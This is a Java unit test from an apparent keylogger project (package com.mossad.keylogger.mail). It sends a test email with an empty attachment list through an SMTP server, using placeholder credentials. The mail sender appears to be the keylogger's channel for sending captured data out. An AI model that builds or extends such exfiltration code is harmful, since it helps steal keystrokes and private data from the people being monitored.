package com.mossad.keylogger.mail;

import org.apache.commons.mail.EmailException;
import org.junit.jupiter.api.Test;

import java.util.Collections;

public class MailSenderTest {

      @Test
      public void sendEmail() throws EmailException {
            MailSender mailSender = new MailSender(
                    "smtp.wp.pl",
                    "some-email@oooooo.pl",
                    "some-password#", MailSender.SMTP_PORT);
            mailSender.prepareEmailWithAttqchment(Collections.emptyList());
            mailSender.send();
      }
}